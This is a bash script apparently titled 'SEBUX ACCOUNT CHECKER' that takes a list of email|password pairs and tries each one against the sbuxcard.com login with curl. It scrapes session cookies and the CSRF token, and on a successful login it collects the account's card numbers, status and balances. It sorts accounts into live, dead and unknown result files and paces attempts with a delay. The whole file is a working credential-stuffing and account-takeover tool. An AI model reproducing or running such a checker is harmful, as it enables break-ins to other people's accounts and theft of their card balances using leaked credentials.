#!/bin/bash
#CODEDBYALCHAPRO AKA ALCHADECODE
RED='\033[0;31m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
ORANGE='\033[0;33m'
PUR='\033[0;35m'
GRN="\e[32m"
WHI="\e[37m"
NC='\033[0m'

echo ""
printf "   $WHI ============================================================ \n"
printf "   $GRN#       $RED█████╗ ██╗      ██████╗███████╗███████╗ ██████╗  $GRN	#\n"
printf "   $GRN#       $RED██╔══██╗██║     ██╔════╝██╔════╝██╔════╝██╔════╝ $GRN	#\n"
printf "   $GRN#       $RED███████║██║     ██║     ███████╗█████╗  ██║  $GRN	#\n"     
printf "   $GRN#       $RED██╔══██║██║     ██║     ╚════██║██╔══╝  ██║  $GRN	#\n"     
printf "   $GRN#       $RED██║  ██║███████╗╚██████╗███████║███████╗╚██████╗ $GRN	#\n"
printf "   $GRN#       $RED╚═╝  ╚═╝╚══════╝ ╚═════╝╚══════╝╚══════╝ ╚═════╝ $GRN	#\n"
printf "   $WHI ============================================================ \n"
printf "   $YELLOW		       SEBUX ACCOUNT CHECKER				\n"
printf "   $WHI ============================================================ \n"
printf "   $YELLOW		   	  -AlchaDecode-				\n"
printf "   $WHI ============================================================ \n"
printf "$NC\n"


# Asking user whenever the
# parameter is blank or null
  # Print available file on
  # current folder
  # clear
  read -p "Show Directory Tree(Y/n): " show
  if [[ ${show,,} == 'y' ]]; then
  echo ""
  tree
  echo ""
  fi
  read -p "Enter mailist file: " inputFile
  if [[ ! $inputFile ]]; then
  printf "$YELLOW Please input the file \n"
  exit
  fi
  if [ ! -e $inputFile ]; then
  printf "$YELLOW File not found \n"
  exit
  fi
  
  if [[ $targetFolder == '' ]]; then
  read -p "Enter target folder: " targetFolder
  # Check if result folder exists
  # then create if it didn't
  if [[ ! $targetFolder ]]; then
  echo "Creating Hasil/ folder"
    mkdir Hasil
    targetFolder="Hasil"
  fi
  if [[ ! -d "$targetFolder" ]]; then
    echo "Creating $targetFolder/ folder"
    mkdir $targetFolder
  else
    read -p "$targetFolder/ folder exists, append to them?(Y/n): " isAppend
    if [[ $isAppend == 'n' ]]; then
    printf "$YELLOW == Thanks For Using AlcSec == \n"
      exit
    fi
  fi
else
  if [[ ! -d "$targetFolder" ]]; then
    echo "Creating $targetFolder/ folder"
    mkdir $targetFolder
  fi
fi
  read -p "Delay time(Default 15s): " perSec
  if [[ $perSec="" ]]; then
		perSec=15
  fi
totalLines=`grep -c "@" $inputFile`
con=1
printf "$CYAN=================================\n"
printf "$YELLOW       CHECKING PROCESS\n"
printf "$CYAN=================================\n"
check(){
time=$5;
header="`date +%H:%M:%S`"
getc=$(curl -c s_cookie.tmp "https://www.sbuxcard.com/index.php?page=signin" -H "Connection: keep-alive" -H "Cache-Control: max-age=0" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "Accept-Encoding: gzip, deflate, br" -H "Accept-Language: en-US,en;q=0.9" --compressed -D - -s -o page.tmp);
srvid=$(cat s_cookie.tmp | grep "SRVID" | grep -Po '(?<=SRVID	)[^ ]*');
visiid=$(cat s_cookie.tmp | grep "visid_incap_1107200" | grep -Po '(?<=visid_incap_1107200	)[^ ]*');
inc=$(cat s_cookie.tmp | grep "incap_ses_392_1107200" | grep -Po '(?<=incap_ses_392_1107200	)[^ ]*');
phpsesid=$(cat s_cookie.tmp | grep "PHPSESSID" | grep -Po '(?<=PHPSESSID	)[^ ]*');
token=$(cat page.tmp | grep '<input type="hidden" name="token" value="' | grep -Po '(?<=value=")[^"]*');
rm page.tmp
rm s_cookie.tmp
#login now
login=$(curl -c s_cookie.tmp 'https://www.sbuxcard.com/index.php?page=signin' -H 'Connection: keep-alive' -H 'Cache-Control: max-age=0' -H 'Origin: https://www.sbuxcard.com' -H 'Upgrade-Insecure-Requests: 1' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Referer: https://www.sbuxcard.com/index.php?page=signin' -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: en-US,en;q=0.9' -H 'Cookie: visid_incap_1107200='$visiid'; _ga=GA1.2.891933291.1526394790; incap_ses_188_1107200='$inc'; PHPSESSID='$phpsesid'; SRVID='$srvid'; _gid=GA1.2.531461359.1527096831; _gat=1' --data 'token='$token'&Email='$1'&Password='$2'&txtaction=signin&emailcount='$3'&passcount='$4'' --compressed -D - -s -o page.tmp);
if grep -q "index.php?page=account" page.tmp; then

newinc=$(cat s_cookie.tmp | grep "incap_ses_392_1107200" | grep -Po '(?<=incap_ses_392_1107200	)[^ ]*');
newphpsesid=$(cat s_cookie.tmp | grep "PHPSESSID" | grep -Po '(?<=PHPSESSID	)[^ ]*');
rm s_cookie.tmp
rm page.tmp
sleep 3;
page=$(curl -c s_cookie.tmp 'https://www.sbuxcard.com/index.php?page=cards' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Referer: https://www.sbuxcard.com/index.php?page=account' -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: en-US,en;q=0.9' -H 'Cookie: visid_incap_1107200='$visiid'; _ga=GA1.2.891933291.1526394790; SRVID='$srvid'; _gid=GA1.2.531461359.1527096831; incap_ses_188_1107200='$newinc'; _gat=1; PHPSESSID='$newphpsesid'' --compressed -D - -s -o page.tmp)
cardlist=$(cat page.tmp | grep -Po '(id="(.*?)" class="card-list)');
cardid=$(echo $cardlist | grep -Po '(?<=id=")[^"]*');
aid=$(cat page.tmp | grep '&data=ey');
ajax=$(echo $aid | grep -Po '(?<="ajax=)[^&]*');
a=($(echo "$cardid" | tr ' ' '\n'))
sleep 3;
total=$(cat page.tmp | grep "My Card(s)" | grep -Po '(?<=<h2 class="mc-title">My Card(s) | Total: )[^<]*');
echo "$email|$pass | $total |" >> $6/ResultSbuxLive.tmp;
numb=${#a[@]}
for (( i=0; i<$numb; i++)); do
card=$(curl -c s_cookie.tmp 'https://www.sbuxcard.com/ajaxController.php?ajax='$ajax'&data='${a[$i]}'&_=1527158116120' -H 'Cookie: visid_incap_1107200='$visiid'; _ga=GA1.2.891933291.1526394790; _gid=GA1.2.531461359.1527096831; SRVID='$srvid'; incap_ses_188_1107200='$newinc'; PHPSESSID='$newphpsesid'; _gat=1' -H 'X-NewRelic-ID: UQcHU15WGwcHV1JXDgU=' -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: en-US,en;q=0.9' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36' -H 'Accept: */*' -H 'Referer: https://www.sbuxcard.com/index.php?page=cards' -H 'X-Requested-With: XMLHttpRequest' -H 'Connection: keep-alive' --compressed -D - -s -o pageo.tmp)
cnum=$(cat pageo.tmp | grep '<strong>Card Number</strong>' | grep -Po '(?<=<td>: )[^<]*');
status=$(cat pageo.tmp | grep -Po '(?<=<font color="#009933">)[^<]*');
balance=$(cat pageo.tmp | grep '<span id="cbal">
								<font color="' | grep -Po '(?<=<font color="#009933"> )[^<]*');
if [[ ! $status ]];then
status='deactive';
fi
if [[ ! $balance ]];then
balance=0;
fi
echo -e "($cnum-$status-$balance)\c";
echo -e "($cnum-$status-$balance)" >> $6/ResultSbuxLive.tmp;
done 
        printf "$GRN $total $CYAN[$header] $NC[ ./Alchmst] \n";
		sleep $time
elif grep -q "index.php?page=signin" page.tmp; then
        printf "$RED DIE $CYAN[$header] $NC [ ./Alchmst] \n";
        echo "[DIE] $email|$pass">> $6/ResultSbuxDie.tmp
		sleep $time
else
        printf "$RED UNKNOWN $CYAN[$header] $NC [ ./Alchmst] ";
		echo "[UNKNOWN] $email|$pass">> $6/ResultSbuxUnknown.tmp
		sleep $time
fi
}

SECONDS=0
for mailpass in $(cat $inputFile); do
	email=$(echo $mailpass | cut -d "|" -f 1)
	pass=$(echo $mailpass | cut -d "|" -f 2)
	jmail=${#email}
	jpass=${#pass}
	indexer=$((con++))
	printf "$CYAN $totalLines/$indexer $NC $email|$pass - "
	check $email $pass $jmail $jpass $perSec $targetFolder
done
if [[ -e $targetFolder/ResultSbuxUnknown.tmp ]]; then
for empas in $(cat $targetFolder/ResultSbuxUnknown.tmp); do
email=$(echo $mailpass | cut -d "|" -f 1)
	pass=$(echo $mailpass | cut -d "|" -f 2)
	jmail=${#email}
	jpass=${#pass}
	indexer=$((con++))
	printf "$CYAN $totalLines/$indexer $NC $email|$pass - "
	check $email $pass $jmail $jpass $perSec $targetFolder
done
fi
duration=$SECONDS
printf "$YELLOW $(($duration / 3600)) hours $(($duration / 60)) minutes and $(($duration % 60)) seconds elapsed. \n"
printf "$YELLOW=============== AlcSec - AlchaDecode =============== \n"
